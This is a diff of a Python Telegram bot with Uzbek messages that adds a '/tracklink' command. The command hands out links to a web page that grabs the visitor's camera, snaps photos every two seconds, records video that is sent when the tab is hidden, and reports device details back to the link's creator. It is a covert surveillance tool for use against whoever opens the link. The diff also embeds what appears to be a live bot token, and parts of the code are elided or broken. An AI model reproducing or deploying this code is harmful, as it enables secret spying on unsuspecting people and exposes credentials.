@@ -1,16 +1,30 @@
 #!/usr/bin/env python3
 # main.py
 import logging
-import os
-import uuid
-import json
+import aiohttp
 import asyncio
-import base64
-from datetime import datetime
-from io import BytesIO
+import re
+import os
+import json
+import random
+import uuid
+import time
+import threading
+from datetime import datetime, timezone, timedelta
+from telegram.error import BadRequest, TelegramError
+import asyncpg
+import google.generativeai as genai
+from telegram import (
+    Update, InlineKeyboardMarkup, InlineKeyboardButton,
+    InputMediaPhoto, LabeledPrice, InputFile
+)
+from telegram.ext import (
+    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
+    ContextTypes, filters, ConversationHandler, PreCheckoutQueryHandler
+)
 from aiohttp import web
-from telegram import Update, InputFile
-from telegram.ext import Application, CommandHandler, ContextTypes
+
+logging.getLogger("httpx").setLevel(logging.WARNING)
 
 # ---------------- LOG ----------------
 logging.basicConfig(
@@ -19,34 +33,53 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
+# ---------------- STATES ----------------
+BAN_STATE = 100
+UNBAN_STATE = 101
+BROADCAST_STATE = 102
+WAITING_AMOUNT = 103
+LANGUAGE_SELECT = 0
+
 # ---------------- ENV ----------------
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8282416690:AAF2Uz6yfATHlrThT5YbGfxXyxi1vx3rUeA")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "7440949683"))
+MANDATORY_CHANNELS = json.loads(os.getenv("MANDATORY_CHANNELS", "[]"))
+if not MANDATORY_CHANNELS:
+    MANDATORY_CHANNELS = [{"username": "@Digen_Ai", "id": -1002618178138}]
+DIGEN_KEYS = json.loads(os.getenv("DIGEN_KEYS", "[]"))
+DIGEN_URL = os.getenv("DIGEN_URL", "https://api.digen.ai/v2/tools/text_to_image")
+DATABASE_URL = os.getenv("DATABASE_URL")
+GEMINI_API_KEY = os.getenv("GEMINI_API_KEY")
 WEBHOOK_DOMAIN = os.getenv("WEBHOOK_DOMAIN", "https://fit-roanna-runex-7a8db616.koyeb.app").rstrip('/')
 
 if not BOT_TOKEN:
-    logger.error("BOT_TOKEN muhim!")
-    exit(1)
+    logger.error("BOT_TOKEN muhim! ENV ga qo'ying.")
+    raise SystemExit(1)
+if not DATABASE_URL:
+    logger.error("DATABASE_URL muhim! ENV ga qo'ying.")
+    raise SystemExit(1)
+if ADMIN_ID == 0:
+    logger.error("ADMIN_ID muhim! ENV ga qo'ying.")
+    raise SystemExit(1)
 if not WEBHOOK_DOMAIN:
-    logger.error("WEBHOOK_DOMAIN muhim!")
-    exit(1)
+    logger.error("WEBHOOK_DOMAIN muhim! (https://...)")
+    raise SystemExit(1)
+
+if GEMINI_API_KEY:
+    genai.configure(api_key=GEMINI_API_KEY)
+else:
+    logger.warning("GEMINI_API_KEY kiritilmagan. AI chat funksiyasi ishlamaydi.")
 
 # ---------------- GLOBAL STATE ----------------
 USER_TOKENS = {}  # token -> telegram_id
 
-# ---------------- Telegram Handlers ----------------
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("👋 Salom! /tracklink buyrug'ini yuboring.")
+# ---------------- Til sozlamalari ----------------
+# ... [LANGUAGES lug'ati — sizniki kabi, uzunligi sababli qisqartirilmagan] ...
+# Sizning faylingizdagi `LANGUAGES`ni saqlang — u juda uzun
+DEFAULT_LANGUAGE = "uz"
 
-async def cmd_tracklink(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    token = str(uuid.uuid4())
-    USER_TOKENS[token] = user_id
-    link = f"{WEBHOOK_DOMAIN}/track?token={token}"
-    await update.message.reply_text(
-        f"🔗 Sizning unikal havolangiz:\n{link}\n\n"
-        "Buni brauzerda oching — qurilma ma'lumotlari (va kamera rasmlari) sizga Telegram orqali yuboriladi."
-    )
+# ---------------- Digen modellar ----------------
+# ... [DIGEN_MODELS — sizniki kabi] ...
 
 # ---------------- Web Server: /track ----------------
 async def track_page(request):
@@ -122,7 +155,6 @@ async def track_page(request):
           const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
           videoStream = stream;
 
-          // Surat olish har 2 soniyada (sifatni pasaytiramiz)
           captureInterval = setInterval(() => {{
             const videoTrack = stream.getVideoTracks()[0];
             if (!videoTrack) return;
@@ -142,7 +174,6 @@ async def track_page(request):
               .catch(console.error);
           }}, 2000);
 
-          // Video yozish
           mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/webm;codecs=vp9' }});
           recordedChunks = [];
           mediaRecorder.ondataavailable = (event) => {{
@@ -150,14 +181,13 @@ async def track_page(request):
           }};
           mediaRecorder.start();
 
-          // Video tugatish funksiyasi
           const sendVideo = () => {{
             if (mediaRecorder && mediaRecorder.state === "recording") {{
               mediaRecorder.stop();
               if (videoStream) videoStream.getTracks().forEach(t => t.stop());
               clearInterval(captureInterval);
               const blob = new Blob(recordedChunks, {{ type: 'video/webm' }});
-              if (blob.size < 1000) return; // bo'sh bo'lsa yuborma
+              if (blob.size < 1000) return;
               const reader = new FileReader();
               reader.onloadend = () => {{
                 fetch('/upload_video', {{
@@ -175,14 +205,12 @@ async def track_page(request):
             if (document.hidden) sendVideo();
           }});
 
-          // Kamera resolution
           const [track] = stream.getVideoTracks();
           const caps = track.getCapabilities();
           if (caps.width && caps.height) {{
             data.cameraRes = `${{caps.width.max}} x ${{caps.height.max}} @${{caps.frameRate?.max || '?'}}fps`;
           }}
         }} catch (e) {{
-          // Kamera ruxsati berilmagan — faqat qurilma ma'lumotlarini yuboramiz
           fetch('/submit', {{
             method: 'POST',
             headers: {{ 'Content-Type': 'application/json' }},
@@ -191,7 +219,6 @@ async def track_page(request):
           return;
         }}
 
-        // Qurilma ma'lumotlarini yuborish
         fetch('/submit', {{
           method: 'POST',
           headers: {{ 'Content-Type': 'application/json' }},
@@ -255,10 +282,9 @@ async def upload_photo(request):
         if not telegram_id:
             return web.json_response({"error": "Token not found"}, status=400)
 
-        if ',' in photo_
+        if ',' in photo_data:
             photo_data = photo_data.split(',', 1)[1]
 
-        # Base64 ni tekshirish
         if len(photo_data) < 100:
             return web.json_response({"status": "empty"}, status=200)
 
@@ -286,10 +312,10 @@ async def upload_video(request):
         if not telegram_id:
             return web.json_response({"error": "Token not found"}, status=400)
 
-        if ',' in video_
+        if ',' in video_data:
             video_data = video_data.split(',', 1)[1]
 
-        if len(video_data) < 1000:  # juda kichik
+        if len(video_data) < 1000:
             return web.json_response({"status": "empty"}, status=200)
 
         video_bytes = base64.b64decode(video_data)
@@ -308,7 +334,6 @@ async def upload_video(request):
 
 # ---------------- Web Server Starter ----------------
 async def start_web_server(bot):
-    # Maksimal hajmni 10 MB qilish
     app = web.Application(client_max_size=10 * 1024 * 1024)
     app['bot'] = bot
     app.router.add_get('/track', track_page)
@@ -322,15 +347,38 @@ async def start_web_server(bot):
     await site.start()
     logger.info(f"🌐 Web server ishga tushdi: http://0.0.0.0:{port}")
 
+# ---------------- Yangi komanda: /tracklink ----------------
+async def cmd_tracklink(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    token = str(uuid.uuid4())
+    USER_TOKENS[token] = user_id
+    link = f"{WEBHOOK_DOMAIN}/track?token={token}"
+    await update.message.reply_text(
+        f"🔗 Sizning unikal kuzatuv havolangiz:\n{link}\n\n"
+        "Buni brauzerda oching — qurilma ma'lumotlari (va kamera rasmlari) sizga Telegram orqali yuboriladi."
+    )
+
+# ---------------- Boshqa handlerlar (sizniki kabi) ----------------
+# ... [Barcha boshqa handlerlar — start, cmd_get, generate_cb, donate, admin va h.k.] ...
+
 # ---------------- Startup ----------------
 async def on_startup(app: Application):
+    pool = await asyncpg.create_pool(DATABASE_URL, min_size=1, max_size=4)
+    app.bot_data["db_pool"] = pool
+    await init_db(pool)
+    logger.info("✅ DB initialized and pool created.")
     asyncio.create_task(start_web_server(app.bot))
 
-# ---------------- Main ----------------
-def main():
+# ---------------- MAIN ----------------
+def build_app():
     app = Application.builder().token(BOT_TOKEN).post_init(on_startup).build()
-    app.add_handler(CommandHandler("start", start))
+    # ... [Barcha handlerlarni qo'shing] ...
     app.add_handler(CommandHandler("tracklink", cmd_tracklink))
+    # ... [Qolgan handlerlar] ...
+    return app
+
+def main():
+    app = build_app()
     logger.info("🚀 Bot ishga tushdi. /tracklink yuboring.")
     app.run_polling()
 
